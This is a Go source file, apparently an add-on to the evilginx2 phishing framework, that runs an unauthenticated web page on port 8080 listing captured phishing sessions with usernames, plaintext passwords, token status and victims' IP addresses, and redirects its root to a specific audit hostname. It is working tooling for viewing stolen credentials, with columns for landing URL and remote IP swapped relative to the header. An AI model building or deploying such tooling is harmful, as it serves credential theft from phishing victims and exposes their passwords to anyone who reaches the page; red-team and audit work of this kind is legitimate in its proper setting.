package core

import (
	"github.com/gorilla/mux"
	"net/http"
	"time"
	"strconv"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type AdminPanel struct {
	srv        *http.Server
	cfg        *Config
	db         *database.Database
}

func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
	log.Debug("Starting handleSessions")

	var body string

	//terminal.go 339

	cols := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "remote ip", "time"}
	sessions, err := a.db.ListSessions()
	if err != nil {
		panic(err)
	}
	if len(sessions) == 0 {
		body = "No saved Sessions found"
	} else {
		var rows [][]string
		for _, s := range sessions {
			tcol := "none"
			if len(s.Tokens) > 0 {
				tcol = "captured"
			}
			row := []string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, tcol, s.RemoteAddr, s.LandingURL, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
			rows = append(rows, row)
		}

		body = AsTable(cols, rows)
	}

	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(body))
}

func NewAdminPanel(cfg *Config, db *database.Database) (*AdminPanel, error) {
	a := &AdminPanel{}

	a.cfg = cfg
	a.db = db

	r := mux.NewRouter()
	a.srv = &http.Server{
		Handler:      r,
		Addr:         ":8080",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.Handle("/", http.RedirectHandler("http://13012-jle.jle.csaudit.de:8080/sessions", 302))
	r.HandleFunc("/sessions", a.handleSessions)

	return a, nil
}

func (a *AdminPanel) Start() {
	go a.srv.ListenAndServe()
}
